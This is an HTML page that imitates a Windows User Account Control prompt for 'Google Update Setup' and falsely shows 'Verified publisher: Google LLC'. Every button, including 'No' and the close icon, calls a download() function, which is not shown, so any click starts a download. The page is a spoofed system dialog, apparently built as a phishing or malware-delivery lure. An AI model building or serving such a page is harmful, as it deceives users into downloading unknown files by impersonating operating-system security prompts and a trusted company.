<head>
  <link rel="stylesheet" href="main.css">
</head>
<body onClick="closeOutline()">

<!--audio无法使用autoplay，直接放弃-->

<div class="theBackground">
  
</div>


  <div class="main-block">
      
    
      <div class="toolbar">
        <span class="toolbarText">User Account Control</span>
        <div class="toolbarButtonGroup">
          <button class="toolButton close-btn" onClick="download()">
            <!--img src="close.svg"-->
            <svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 24 24" style="enable-background:new 0 0 24 24;" xml:space="preserve">
              <path d="M19,6.4L17.6,5L12,10.6L6.4,5L5,6.4l5.6,5.6L5,17.6L6.4,19l5.6-5.6l5.6,5.6l1.4-1.4L13.4,12L19,6.4z">
              </path>
            </svg>
          </button>
        </div>
      </div>
      <div class="block-header">
        <span class="headerText">
          Do you want to allow this app to make changes to your device?
          </span>
          
      </div>
      <div class="FileInfo">
          <img class="FileLogo" src="logo.png">
        <span class="FileName">Google Update Setup</span>
    </div>
    <div class="FileDetail">
      <span class="FileDetail-detail">Verified publisher: Google LLC
        <br>File origin: Hard drive on this computer</span>
      <br>
      <button class="FileDetail-show" onClick="download()">Show more details</button>
    </div>
    
    <div class="bottom-button-group">
      <!--button class="bothButton non-default-button">Yes</button>
      <button class="bothButton default-button">No</button-->
      <span class="bothButton non-default-button" onClick="download()">Yes</span>
      <span class="bothButton default-button" onClick="download()">No</span>
      <span class="bothButton" id="default-button-outline"></span> 
      <!--default-button-outline这个元素在点击任何位置之后会消失，所以onClick放到body那里了-->
    </div>
    
  </div>
</body>
